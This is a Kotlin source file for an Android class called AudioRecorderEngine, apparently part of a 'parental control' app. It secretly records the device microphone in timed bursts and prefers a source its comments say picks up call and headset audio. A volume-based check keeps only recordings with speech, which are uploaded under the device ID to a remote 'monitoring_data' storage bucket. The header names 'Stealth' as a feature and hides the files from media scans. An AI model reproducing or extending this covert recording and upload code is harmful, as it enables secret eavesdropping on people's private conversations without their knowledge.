package com.example.parentalcontrol

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * AudioRecorderEngine v16
 *
 * Features:
 * ─────────────────────────────────────────────────────────────────────
 * • Pulse recording: record for [durationMs] → silence-check → upload/discard
 * • Energy-based VAD (Voice Activity Detection):
 *     Samples maxAmplitude every VAD_SAMPLE_INTERVAL_MS.
 *     A window of VAD_WINDOW_SIZE samples is evaluated.
 *     If the ratio of "active" samples (above ENERGY_THRESHOLD) is below
 *     MIN_ACTIVE_RATIO, the recording is classified as silent → discarded.
 * • Audio source priority:
 *     VOICE_COMMUNICATION → VOICE_RECOGNITION → MIC
 *     (VOICE_COMMUNICATION captures both earpiece + mic — works with
 *      Bluetooth A2DP and wired headsets on most OEMs)
 * • Output: .m4a (AAC/MPEG-4) @ 16 kHz / 32 kbps ≈ 14 KB/min
 * • Stealth: files written to cacheDir (excluded from media scans)
 * ─────────────────────────────────────────────────────────────────────
 */
class AudioRecorderEngine(private val context: Context) {

    companion object {
        private const val TAG = "AudioRecorderEngine"
        private const val BUCKET = "monitoring_data"

        // ── VAD parameters ────────────────────────────────────────────
        /**
         * How often to sample the amplitude (ms).
         * Lower = more accurate VAD but slightly more CPU.
         */
        private const val VAD_SAMPLE_MS = 500L

        /**
         * Number of samples in the evaluation window.
         * Window = VAD_SAMPLE_MS × VAD_WINDOW → e.g. 500 ms × 20 = 10 s window.
         */
        private const val VAD_WINDOW = 20

        /**
         * MediaRecorder.maxAmplitude returns 0–32767.
         * A value > ENERGY_THRESHOLD is considered "speech detected".
         * Typical ambient noise floor: ~200–600. Human speech: ~3 000–15 000.
         */
        private const val ENERGY_THRESHOLD = 1_200

        /**
         * Minimum fraction of samples that must be above ENERGY_THRESHOLD
         * for the recording to be considered "active" (not silent).
         * 0.15 = at least 15% of samples had speech → keep file.
         */
        private const val MIN_ACTIVE_RATIO = 0.15f

        /** Discard files smaller than this (likely corrupt/empty). */
        private const val MIN_FILE_BYTES = 2_048L
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    @Volatile private var isRecording = false

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Ring buffer of amplitude samples for VAD
    private val amplitudeWindow = ArrayDeque<Int>(VAD_WINDOW)

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Record for [durationMs] ms. VAD runs concurrently.
     * If classified as silent → file is deleted. Otherwise → uploaded.
     * Fire-and-forget; safe to call from any coroutine context.
     */
    fun recordAndUpload(durationMs: Long) {
        if (isRecording) { Log.w(TAG, "Already recording — skipped"); return }
        scope.launch {
            if (startRecorderInternal()) {
                sampleVadWhileRecording(durationMs)
                val wasSpeech = evaluateVad()
                stopRecorderInternal()
                processResult(wasSpeech)
            }
        }
    }

    /** Start an open-ended recording session (stopped by [stopRecording]). */
    fun startRecording(): Boolean = startRecorderInternal()

    /**
     * Stop the open-ended session.
     * @param upload true = upload if VAD passes; false = discard.
     */
    fun stopRecording(upload: Boolean = true) {
        scope.launch {
            val wasSpeech = if (upload) evaluateVad() else false
            stopRecorderInternal()
            if (upload) processResult(wasSpeech)
        }
    }

    fun isRecordingActive() = isRecording

    // ── Internal recording lifecycle ───────────────────────────────────────────

    private fun startRecorderInternal(): Boolean {
        if (isRecording) return false
        return try {
            amplitudeWindow.clear()
            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
            val file = File(context.cacheDir, "rec_$ts.m4a")
            currentFile = file

            recorder = buildRecorder(file)
            recorder!!.prepare()
            recorder!!.start()
            isRecording = true
            Log.i(TAG, "Recording started → ${file.name}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Start failed: ${e.message}")
            safeReleaseRecorder()
            false
        }
    }

    private fun stopRecorderInternal() {
        try { recorder?.stop() } catch (e: Exception) { Log.w(TAG, "stop(): ${e.message}") }
        safeReleaseRecorder()
        isRecording = false
        Log.i(TAG, "Recording stopped")
    }

    private fun safeReleaseRecorder() {
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
    }

    // ── VAD engine ────────────────────────────────────────────────────────────

    /**
     * Concurrently sample amplitude at VAD_SAMPLE_MS intervals while recording.
     * Runs for [durationMs] total, then returns.
     */
    private suspend fun sampleVadWhileRecording(durationMs: Long) {
        val endAt = System.currentTimeMillis() + durationMs
        while (System.currentTimeMillis() < endAt && isRecording) {
            val amp = try { recorder?.maxAmplitude ?: 0 } catch (_: Exception) { 0 }
            if (amplitudeWindow.size >= VAD_WINDOW) amplitudeWindow.removeFirst()
            amplitudeWindow.addLast(amp)
            delay(VAD_SAMPLE_MS)
        }
    }

    /**
     * Returns true if the sample window contains enough "speech" frames.
     * Formula: count of samples above ENERGY_THRESHOLD / total samples ≥ MIN_ACTIVE_RATIO
     */
    private fun evaluateVad(): Boolean {
        if (amplitudeWindow.isEmpty()) return false
        val activeCount = amplitudeWindow.count { it >= ENERGY_THRESHOLD }
        val ratio = activeCount.toFloat() / amplitudeWindow.size
        val hasSpeech = ratio >= MIN_ACTIVE_RATIO
        val peak = amplitudeWindow.maxOrNull() ?: 0
        Log.d(TAG, "VAD → active=$activeCount/${amplitudeWindow.size} ratio=${"%.2f".format(ratio)} peak=$peak speech=$hasSpeech")
        return hasSpeech
    }

    // ── Post-recording processing ─────────────────────────────────────────────

    private suspend fun processResult(hasSpeech: Boolean) = withContext(Dispatchers.IO) {
        val file = currentFile ?: return@withContext

        if (!file.exists() || file.length() < MIN_FILE_BYTES) {
            file.delete()
            Log.d(TAG, "Discarded: file too small (${file.length()} B)")
            return@withContext
        }

        if (!hasSpeech) {
            file.delete()
            Log.d(TAG, "Discarded: VAD classified as silent")
            SupabaseManager.getInstance()
                .logRemote(context, TAG, "DEBUG", "Silent recording discarded")
            return@withContext
        }

        // Has speech → upload
        uploadFile(file)
    }

    private suspend fun uploadFile(file: File) {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val result = SupabaseManager.getInstance().uploadFile(
                file   = file,
                bucket = BUCKET,
                folder = "audio/$deviceId",
                customFileName = file.name
            )

            if (result is UploadResult.Success) {
                Log.i(TAG, "Audio uploaded: ${file.name} (${file.length() / 1024} KB)")
                SupabaseManager.getInstance()
                    .logRemote(context, TAG, "INFO", "Audio OK: ${result.fileName}")
            } else {
                val err = (result as? UploadResult.Error)?.message ?: "unknown"
                Log.e(TAG, "Upload failed: $err")
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadFile error: ${e.message}")
        } finally {
            currentFile?.delete()
        }
    }

    // ── MediaRecorder factory ─────────────────────────────────────────────────

    private fun buildRecorder(outputFile: File): MediaRecorder {
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(context)
        else
            @Suppress("DEPRECATION") MediaRecorder()

        // Audio source priority:
        // VOICE_COMMUNICATION: captures both earpiece+mic incl. BT/wired headset
        // VOICE_RECOGNITION: good for ambient; no echo-canceller applied
        // MIC: universal fallback
        val sourceChain = listOf(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.MIC
        )
        var chosen = MediaRecorder.AudioSource.MIC
        for (src in sourceChain) {
            try {
                rec.setAudioSource(src)
                chosen = src
                break
            } catch (_: Exception) {}
        }
        Log.d(TAG, "Audio source selected: $chosen")

        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        rec.setAudioSamplingRate(16_000)     // 16 kHz — voice range sufficient
        rec.setAudioEncodingBitRate(32_000)  // 32 kbps → ~14 KB/min
        rec.setOutputFile(outputFile.absolutePath)
        return rec
    }
}
